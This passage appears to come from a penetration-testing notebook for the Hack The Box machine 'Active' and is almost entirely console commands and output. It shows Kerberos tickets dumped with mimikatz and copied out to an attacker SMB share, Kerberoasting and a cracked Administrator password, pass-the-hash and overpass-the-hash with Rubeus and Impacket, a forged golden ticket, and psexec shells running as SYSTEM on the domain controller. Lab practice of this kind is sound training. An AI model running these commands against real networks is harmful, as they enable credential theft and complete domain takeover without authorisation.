   * Saved to file     : 0-60a00000-dc$@krbtgt~ACTIVE.HTB-ACTIVE.HTB.kirbi

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : krbtgt/ACTIVE.HTB @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 
   * Saved to file     : 1-40e00000-dc$@krbtgt~ACTIVE.HTB-ACTIVE.HTB.kirbi

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 2:02:20 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : GC/DC.active.htb/active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 2-40a40000-dc$@GC~DC.active.htb~active.htb-ACTIVE.HTB.kirbi

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : DC$ @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 3-40a40000-dc$@DC$-ACTIVE.HTB.kirbi

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : cifs/DC.active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 4-40a40000-dc$@cifs~DC.active.htb-ACTIVE.HTB.kirbi

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:58 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : ldap/DC.active.htb/active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 5-40a40000-dc$@ldap~DC.active.htb~active.htb-ACTIVE.HTB.kirbi

[00000006] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : LDAP/DC @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 6-40a40000-dc$@LDAP~DC-ACTIVE.HTB.kirbi

[00000007] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : ldap/DC.active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 7-40a40000-dc$@ldap~DC.active.htb-ACTIVE.HTB.kirbi
```
```console
C:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Windows\Temp

24/01/2022  05:09 ºú    <DIR>          .
24/01/2022  05:09 ºú    <DIR>          ..
24/01/2022  05:09 ºú             1.200 0-60a00000-dc$@krbtgt~ACTIVE.HTB-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.232 1-40e00000-dc$@krbtgt~ACTIVE.HTB-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.400 2-40a40000-dc$@GC~DC.active.htb~active.htb-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.348 3-40a40000-dc$@DC$-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.380 4-40a40000-dc$@cifs~DC.active.htb-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.404 5-40a40000-dc$@ldap~DC.active.htb~active.htb-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.358 6-40a40000-dc$@LDAP~DC-ACTIVE.HTB.kirbi
24/01/2022  05:09 ºú             1.380 7-40a40000-dc$@ldap~DC.active.htb-ACTIVE.HTB.kirbi
16/07/2018  12:11 úú                 0 DMIC58F.tmp
12/01/2022  03:01 úú               140 fwtsqmfile00.sqm
21/07/2018  03:33 úú                 0 FXSAPIDebugLogFile.txt
21/07/2018  03:33 úú                 0 FXSTIFFDebugLogFile.txt
30/07/2018  09:42 ºú    <DIR>          IEDBCE.tmp
10/08/2021  11:22 úú         1.355.680 mimikatz.exe
30/07/2018  03:47 úú           196.608 TS_E775.tmp
30/07/2018  03:47 úú           196.608 TS_E92B.tmp
18/07/2018  06:45 úú    <DIR>          vmware-SYSTEM
12/01/2022  03:48 úú            20.474 vmware-vmsvc-SYSTEM.log
12/01/2022  03:11 úú           197.560 vmware-vmsvc.log
12/01/2022  03:30 úú             1.064 vmware-vmtoolsd-Administrator.log
24/01/2022  01:47 ºú             1.064 vmware-vmtoolsd-SYSTEM.log
12/01/2022  03:48 úú             6.942 vmware-vmusr-Administrator.log
12/01/2022  03:11 úú            71.097 vmware-vmusr.log
24/01/2022  01:47 ºú               288 vmware-vmvss-SYSTEM.log
12/01/2022  03:03 úú             2.968 vmware-vmvss.log
              23 File(s)      2.061.195 bytes
               4 Dir(s)   1.272.262.656 bytes free

C:\Windows\Temp>
```
```console
C:\Windows\Temp>copy 3-40a40000-dc$@DC$-ACTIVE.HTB.kirbi \\10.10.14.12\folder\3-40a40000-dc$@DC$-ACTIVE.HTB.kirbi
        1 file(s) copied.
```
```console
┌──(root💀kali)-[/opt/tools/mimikatz/x64]
└─# python /usr/share/john/kirbi2john.py file.kirbi
Unsupported etype 18 seen! Please report this to us.
$krb5tgs$unknown:$krb5tgs$18$ab9f56408dd202b4c55dca70b5bd69c4$d9581ce22eaee73afc9c3aedcdb632a45002430cca6c2befb80dabb1487311b07af49dfec6ce2e420692d314e000424de4b845c319f5928770b6e157a16062df8ba8dad398ef7a7d8156d3e79c01073d6f57c399f6d1c1cbeb22e5dddbba398de9471d531fd6d3c849bd874e2cf9e83427abe09a2ad00e5acd4f83c96a269e94f43550fc5072fcde02e443b8a67fefe084035f4ac14dd9111ef350fcd6f61325946c03258c17fdf02c097ce3e943a7dad0cbb433470c2e48f85e98097d38cf0428df2c0b261275aa57a205d69b5ab4ccb91be895138e871395a7c2c8082c34a8f14a1a6fcca7b79302da37f87b07f9308810991c60040b34343578ee5be9317a35dd4299241e6a94d759ac81b4caa169462ca426b21c7ec8cb0bb69620e904f145f39674dce564e74eaf833f8e523b5d9f54365e385a13fff70df88d195507ee8fe41a93e314400b7cccb9a7f41077a5c926dbfdb1192ac89eefe11f9df4c0645a55a0d502a23dd92b214e2510bcf691be75dce009d5760a18b578462705b0cd3bf92bae40c2dfefbe56f0ed5b8a0f90ae3cff0529db90f3429965a68609a3faa8bf14e9df80d6bb7d0a878754db9662bccc0e29c4d058a2a34683d5d9007bc685f4548b59c3f94ad73780c50adf9f756b88d2e3df6ac90b99a5b7035080a23c02486065e7958018b8df2679f0c01f8acdf5a7e797e7076ad9c34c8568bc91fcff1061ed95c7106e5786b7d4ad9df3b210093f1f80e6fd46f305acfe5b3c39bd2aed79a35c95b75ccd7f70c14c35dab59bc391de7814cc24d22b66442f62bdf823933311bf2dac13114b6f57e15a9d02ee5ebf85e25041871577248838317d05201b7df75b52543afd99d1b7ed41628beb66b283a5a512c879906798111a186d1cf3c2bef14ed0fbe1f10d5ed06695e36ee4117efe12a207bbf0b1a9e811865fec057934ed12c8e0115211b0ef90070a3d8e4de200dd59a0c53fa2e07e76e3fb9e2c474c6b64bafb518b67b5b72959a4d3c5c5bf91db06bf921666cf4f53d21a7066713a5a26d363398c11f2b7a949745f5a0e3864b2adac29af3d34d0ee5176ef83305be1e0236a1457ebb9569f0e5dd640192cfd3f6c991f423a7489397dcdf0639633e9078c563e7530b74945cabfe966b491f174d7a6bfa6a33b07246829bc6326be5ee39f689854e8bfeb224ad6d8a5a35917924625e051db49f49bd66d7a6d950d8195e35ebfd0958ea07595ec1adb6b978fc9302416c5face08013884443ec905600de1d99705e2d90f57774be2af5396e2a5a57ef74a2976480248bc10d9e5dc7beb400e0116398a1c3f22c1dec15b30ada54aeeef091fcf9753372a339ce1bb70b506ad13f5bee3c1a15c2a1f8d915357b6759086bbe78f397a355170acdef75293d5b9c14502c713c326c1630c32f82f19f662df3a9cede16e689bfbf6a40c
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_kirbi
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```                    

#### Rubeus
```console
C:\Windows\Temp>Rubeus.exe kerberoast /outfile:hash.txt
 
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : active.htb
[*] Searching path 'LDAP://DC.active.htb/DC=active,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=active,DC=htb
[*] ServicePrincipalName   : active/CIFS:445
[*] PwdLastSet             : 18/7/2018 10:06:40 úú
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\hash.txt

[*] Roasted hashes written to : C:\Windows\Temp\hash.txt
```
```console
C:\Windows\Temp>type C:\Windows\Temp\hash.txt
$krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$0F5F05628F5E3CFC7AF946B4B5BD36FF$CD5C7CAE4EA64695FFFFF9540A8986B1CD04B02BAA7480DAA71EEFF1F62B46CFC0CC205D617CEA9A5A5E774BB64FCD2D11072D5BDE9BF335E6E8681C2886FD7AC91130E716BEF9D0110FD68262D6094D3ED9DEDCA9EAF3C0C4435609386597BA2F7516876A3B9C06360FF1F2B0ED9C709C42B0F8F97B4616867AE567234BAEC807A30B8EA03182E041F089BF9F5A39E470965099908E139BD8947DDFF91602C142B25616E8F55D0A3AA71C98FBE9AA6F76E348E0950639B5B453DC34829493CD5A167C1FD1DEC543B80B027278475A0C5F819C4CC3FAC1A01A5A46D26500D2FD2F76D693EDBB7E3EEE1273FD88194FF7492FA063534321FD964AC3A6CA04AD1E3930D3A77B12C36674A94D4E609C679B54D87234748239660D7BF2AECDEC01A5EF69C13070B46B25CF9A56E673E4AD9C8E130C0119B5BD412CE21B0F302E664F576D5D43A69B078EEE91178C188B3060F5D61774688249EA2EF56A73D184290A0AA484EE6B47B3C7CF8EEA02A4ED4E56E3A7D2FDC5578C767C74E5FD02A1334891214796696C32D3D6CC8F02D6D560FC7FB63D4EF7A6A2D852B74333CA421EA351C4C6A100A2E2E3744CA672AC3F93016F7A4249DAEAE428424AA6878B75AB5E7FD8C7B90641A2E669D9F5F5B52279F79E64DE9EAA75B97F812CE460C4778C64D5A6F878B00EB0983369160B7A1F67FC685339B1B0C2C5F98737D3EAD5A9F62CB563C2E8CA5B31683DFCF2863795FFBC2F4DC5A1038532CD1F6953EF8A6486BF8CA163B5E36BA7BF6178E67233581EC02882ACBF85FD4B0BA961DB87C34E3595D28E016224BB07EB0D82F5DC5C2ED258F0FAD0BADF3E6617502542EF1CEA5748B7256A2758A1DAE6919C2E6D3E911131D2E449B4847E77471AEC88323289D3783E052D9D54C691AF9128583C92FFBCDE8CE466EBCF5A76F7CE5A3AF45C82389A7F89CC8A76998B0E2E9D87558102A5D97AE4F39BEBA05FE5579C4453D5AAD7A7F417F974CFCAC66989C3EAA0E97EB736087135FA6661692D1D3B82D6475C603AD4AF08324E9B987070E14AF8C5890F9EFF0C2088EF6B69BFA41AB6E89F2F411FE5D593375094085E78D4214AF107A120F48586B177DB9A85F0A6D3BD9B6814486B4947EADC268033E1C2B8F296EDB458AB687DB0859B7E5BA36EEFA4657E86E626E3D987ACABF8CAD43430A2D96149950928E46DF84747DB8D68DD50F33563677BEDE14B29BB8E1693213607E4C49AF3C9B94125314F946EEA1063A57E01EDE312E9E985335C5EE1C71E5862F6FC108D20DAD2997CAB939D17ADA1E21CDF6D8CA60CA28FC3982D7FEF190FE0C487D46DF1A400D4980CD73D96FBBDB2EB04E37DB2D90987C35B3F88E32B8146A58C9A1BFB4F967DBAFB19C29DDF57A9068CD04879F5D83358A307B3A5435EC417568875FA09C3EB741FF518
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# hashcat -m 13100  -a 0 hash_rubeus.txt /usr/share/wordlists/rockyou.txt --show
Hashfile 'hash_rubeus.txt' on line 1 (C:\Win...mp>type C:\Windows\Temp\hash.txt): Separator unmatched
$krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$0f5f05628f5e3cfc7af946b4b5bd36ff$cd5c7cae4ea64695fffff9540a8986b1cd04b02baa7480daa71eeff1f62b46cfc0cc205d617cea9a5a5e774bb64fcd2d11072d5bde9bf335e6e8681c2886fd7ac91130e716bef9d0110fd68262d6094d3ed9dedca9eaf3c0c4435609386597ba2f7516876a3b9c06360ff1f2b0ed9c709c42b0f8f97b4616867ae567234baec807a30b8ea03182e041f089bf9f5a39e470965099908e139bd8947ddff91602c142b25616e8f55d0a3aa71c98fbe9aa6f76e348e0950639b5b453dc34829493cd5a167c1fd1dec543b80b027278475a0c5f819c4cc3fac1a01a5a46d26500d2fd2f76d693edbb7e3eee1273fd88194ff7492fa063534321fd964ac3a6ca04ad1e3930d3a77b12c36674a94d4e609c679b54d87234748239660d7bf2aecdec01a5ef69c13070b46b25cf9a56e673e4ad9c8e130c0119b5bd412ce21b0f302e664f576d5d43a69b078eee91178c188b3060f5d61774688249ea2ef56a73d184290a0aa484ee6b47b3c7cf8eea02a4ed4e56e3a7d2fdc5578c767c74e5fd02a1334891214796696c32d3d6cc8f02d6d560fc7fb63d4ef7a6a2d852b74333ca421ea351c4c6a100a2e2e3744ca672ac3f93016f7a4249daeae428424aa6878b75ab5e7fd8c7b90641a2e669d9f5f5b52279f79e64de9eaa75b97f812ce460c4778c64d5a6f878b00eb0983369160b7a1f67fc685339b1b0c2c5f98737d3ead5a9f62cb563c2e8ca5b31683dfcf2863795ffbc2f4dc5a1038532cd1f6953ef8a6486bf8ca163b5e36ba7bf6178e67233581ec02882acbf85fd4b0ba961db87c34e3595d28e016224bb07eb0d82f5dc5c2ed258f0fad0badf3e6617502542ef1cea5748b7256a2758a1dae6919c2e6d3e911131d2e449b4847e77471aec88323289d3783e052d9d54c691af9128583c92ffbcde8ce466ebcf5a76f7ce5a3af45c82389a7f89cc8a76998b0e2e9d87558102a5d97ae4f39beba05fe5579c4453d5aad7a7f417f974cfcac66989c3eaa0e97eb736087135fa6661692d1d3b82d6475c603ad4af08324e9b987070e14af8c5890f9eff0c2088ef6b69bfa41ab6e89f2f411fe5d593375094085e78d4214af107a120f48586b177db9a85f0a6d3bd9b6814486b4947eadc268033e1c2b8f296edb458ab687db0859b7e5ba36eefa4657e86e626e3d987acabf8cad43430a2d96149950928e46df84747db8d68dd50f33563677bede14b29bb8e1693213607e4c49af3c9b94125314f946eea1063a57e01ede312e9e985335c5ee1c71e5862f6fc108d20dad2997cab939d17ada1e21cdf6d8ca60ca28fc3982d7fef190fe0c487d46df1a400d4980cd73d96fbbdb2eb04e37db2d90987c35b3f88e32b8146a58c9a1bfb4f967dbafb19c29ddf57a9068cd04879f5d83358a307b3a5435ec417568875fa09c3eb741ff518:Ticketmaster1968
```

### Attack - Over The Pass
#### Mimikatz
```console
C:\Windows\Temp>mimikatz.exe
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
 
Authentication Id : 0 ; 3891076 (00000000:003b5f84)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 24/1/2022 6:41:52 ╧Ç╬╝
SID               : S-1-5-18

         * Username : dc
         * Domain   : active.htb
         * Password : (null)
         * Key List :
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           rc4_hmac_nt       bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old      bdfd7b5acf78eba25920e83fdd4d001d
           rc4_md4           bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_nt_exp   bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old_exp  bdfd7b5acf78eba25920e83fdd4d001d

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC$
Domain            : ACTIVE
Logon Server      : (null)
Logon Time        : 24/1/2022 1:47:10 ╧Ç╬╝
SID               : S-1-5-20

         * Username : dc$
         * Domain   : ACTIVE.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       1e045c69db12a23e9ef95a88e90f2c58dead9be57df7e3968fa1b6c6424bb9d0
           rc4_hmac_nt       bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old      bdfd7b5acf78eba25920e83fdd4d001d
           rc4_md4           bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_nt_exp   bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old_exp  bdfd7b5acf78eba25920e83fdd4d001d

Authentication Id : 0 ; 3876985 (00000000:003b2879)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 24/1/2022 6:39:06 ╧Ç╬╝
SID               : S-1-5-18

         * Username : dc
         * Domain   : active.htb
         * Password : (null)
         * Key List :
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           rc4_hmac_nt       bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old      bdfd7b5acf78eba25920e83fdd4d001d
           rc4_md4           bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_nt_exp   bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old_exp  bdfd7b5acf78eba25920e83fdd4d001d

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC$
Domain            : ACTIVE
Logon Server      : (null)
Logon Time        : 24/1/2022 1:47:08 ╧Ç╬╝
SID               : S-1-5-18

         * Username : dc$
         * Domain   : ACTIVE.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       1e045c69db12a23e9ef95a88e90f2c58dead9be57df7e3968fa1b6c6424bb9d0
           rc4_hmac_nt       bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old      bdfd7b5acf78eba25920e83fdd4d001d
           rc4_md4           bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_nt_exp   bdfd7b5acf78eba25920e83fdd4d001d
           rc4_hmac_old_exp  bdfd7b5acf78eba25920e83fdd4d001d

mimikatz # 
```
```console
mimikatz # sekurlsa::pth /user:dc /domain:active.htb /ntlm:bdfd7b5acf78eba25920e83fdd4d001d /run:cmd.exe
user    : dc
domain  : active.htb
program : cmd.exe
impers. : no
NTLM    : bdfd7b5acf78eba25920e83fdd4d001d
  |  PID  2468
  |  TID  1988
  |  LSA Process is now R/W
  |  LUID 0 ; 3916436 (00000000:003bc294)
  \_ msv1_0   - data copy @ 000000000BE19FD0 : OK !
  \_ kerberos - data copy @ 000000000BE10E08
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000000000BDFE078 (16) -> null

# .\PsExec.exe \\dc01 cmd.exe
```

#### Rubeus
```console
C:\Windows\Temp>Rubeus.exe asktgt /domain:active.htb /user:dc /rc4:bdfd7b5acf78eba25920e83fdd4d001d /ptt
 
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: bdfd7b5acf78eba25920e83fdd4d001d
[*] Building AS-REQ (w/ preauth) for: 'active.htb\dc'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIEqjCCBKagAwIBBaEDAgEWooIDyzCCA8dhggPDMIIDv6ADAgEFoQwbCkFDVElWRS5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCmFjdGl2ZS5odGKjggOHMIIDg6ADAgESoQMCAQKiggN1BIIDcaAVA2rbh7iZ
      T2EoKF+sPTRqKksjJyjwb2yS2UsXWiw47eNRlx/9I3/RwXwP3ndhae+6rAtP0rDm6yWmqhd7ZlZK3eGK
      4d7a9F0QcUqXbW9keSDxNwn952hv2JEAsOh/FQynQWJfBD1zUnBxsBMTGPZGom+DtsgfRBqviK4Twc8S
      C65pGT+xyQT3/P5QAi2DQh+QGlCk2fYjoFp6bVdl4ZmzdazpGaAMHpEHPOEqVEF0pYYKuhox7X8wL1k2
      mGwDzdYNzm5cLKzlfcYU/gUVVvfZgqQgwy3DQnR4ZaTe4m2V9y62lxCtQtesc9k2fG3ccvYzXLtBWHFV
      nIcctTy8yjy1/a4SkDJTYV0kECyKWZrA3EC7VCZFAroRQ54BMHxSHozpdaJPfuX6zwZMpBHhWjvSVyWv
      Gxx62BURPFyCXwMYp7b651CzXSvkJaFBrMMYh9FrCaVC+fQh1vGPTXOrbYWSPERLFc/RpjjeRsNxFyy9
      0mjAVNujXZ0brX70odXVO16Qio38yNXZZCI+saUyToANzXUQaDzCxe/coCwq+/wk3Int9kNPwDV4+EtY
      v5zv9Or38NrSY1drjTel7CHFws6rxf03NSEvJjagdg7wUzBmTAVcmAF4GwMG3MXXxF8ZB+x09HyNxSiN
      jdq8q7/BOkRENrtQ5zxNaxHaXSOC6B5Tn9ajux5IYhE7+jDTKSjhlhHVp3jrBTBKZlhQFloO91tM/i8r
      GDJP+MECTvqA2E6fOpOeaDF1da9X5ZDmxR2wBTilXtxyQV38pQLIGus3yivlWlyCBJRnNjHPAa5RfGje
      PBoPg5mBC/h8hGnuLFXJIoiFuzbALi1E9WbIpDOCu//YHHxzofCBLr4nKs3d+61cI7d/Risoku62prS4
      cx2LQQQM8+Fm+NjO/U1gHIRvLLRuO15GBt5JgdiTSUCCoEDkq4E2WlRrTBR1hWdoES+HasmsFJ0Xc/Q7
      uzSHKtRKzb0wAHC59uTkOcvA5dbO9yg1Qy2+7d+urMoV8jpr8b4G4tBAJsgUrzmNrhFEnqsEafe38Iu1
      pd+2pgthpcbYxOuNhrHYRMdq7DXyfLVGCjE18jIwBclAHSo2Yl+xf+XeJX9YGMHIOuaonaQDitwfkd53
      cP2ab0BPz3Mm7PSRSpN00X3opTrxqdF/d7e/AZADggBRo4HKMIHHoAMCAQCigb8Egbx9gbkwgbaggbMw
      gbAwga2gGzAZoAMCARehEgQQHZDuaD3lPtcb28ube/CB6aEMGwpBQ1RJVkUuSFRCog8wDaADAgEBoQYw
      BBsCZGOjBwMFAEDgAAClERgPMjAyMjAxMjQwNDUwNDVaphEYDzIwMjIwMTI0MTQ1MDQ1WqcRGA8yMDIy
      MDEzMTA0NTA0NVqoDBsKQUNUSVZFLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKYWN0aXZlLmh0Yg==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/active.htb
  ServiceRealm             :  ACTIVE.HTB
  UserName                 :  dc
  UserRealm                :  ACTIVE.HTB
  StartTime                :  24/1/2022 6:50:45 ºú
  EndTime                  :  24/1/2022 4:50:45 úú
  RenewTill                :  31/1/2022 6:50:45 ºú
  Flags                    :  pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  HZDuaD3lPtcb28ube/CB6Q==
  ASREP (key)              :  BDFD7B5ACF78EBA25920E83FDD4D001D
```
```console
C:\Windows\Temp>dir \\DC\c$
 Volume in drive \\DC\c$ has no label.
 Volume Serial Number is 15BB-D59C

 Directory of \\DC\c$

14/07/2009  05:20 ºú    <DIR>          PerfLogs
12/01/2022  03:11 úú    <DIR>          Program Files
21/01/2021  06:49 úú    <DIR>          Program Files (x86)
21/07/2018  04:39 úú    <DIR>          Users
24/01/2022  06:37 ºú    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)   1.273.081.856 bytes free

C:\Windows\Temp>
# .\PsExec.exe \\dc01 cmd.exe
```

```console
#### Impacket
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-getTGT active.htb/dc -dc-ip 10.10.10.100 -hashes :bdfd7b5acf78eba25920e83fdd4d001d
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Saving ticket in dc.ccache
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# python /usr/local/bin/psexec.py -k -n active.htb/DC@DC.active.htb cmd.exe                                                                                                            1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on DC.active.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable. 
```

#### Golden ticket

https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/
```console
# Get hash krb from mimikatz

┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-ticketer -nthash b889e0d47d6fe22c8f0463a717f460dc -domain-sid S-1-5-21-405608879-3187717380-1996298813 -domain active.htb dc           
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for active.htb/dc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in dc.ccache
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# python /usr/local/bin/psexec.py -k -n active.htb/dc@DC.active.htb cmd.exe                                                                                                            1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on DC.active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file EhifewFP.exe
[*] Opening SVCManager on DC.active.htb.....
[*] Creating service kZfv on DC.active.htb.....
[*] Starting service kZfv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-psexec -k -n active.htb/dc@DC.active.htb cmd.exe 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on DC.active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file TETbGLfO.exe
[*] Opening SVCManager on DC.active.htb.....
[*] Creating service VQtw on DC.active.htb.....
[*] Starting service VQtw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on DC.active.htb.....
[*] Stopping service VQtw.....
[*] Removing service VQtw.....
[*] Removing file TETbGLfO.exe.....
```


```console
┌──(root💀kali)-[/opt/kerbrute]
└─# python3 kerbrute.py -user Administrator -password Ticketmaster1968 -domain active.htb -dc-ip 10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Stupendous => Administrator:Ticketmaster1968
[*] Saved TGT in Administrator.ccache
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# python /usr/local/bin/psexec.py -k -n active.htb/Administrator@DC.active.htb cmd.exe 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on DC.active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file YTxhzssC.exe
[*] Opening SVCManager on DC.active.htb.....
[*] Creating service cFYg on DC.active.htb.....
[*] Starting service cFYg.....
[!] Press help for extra shell commands
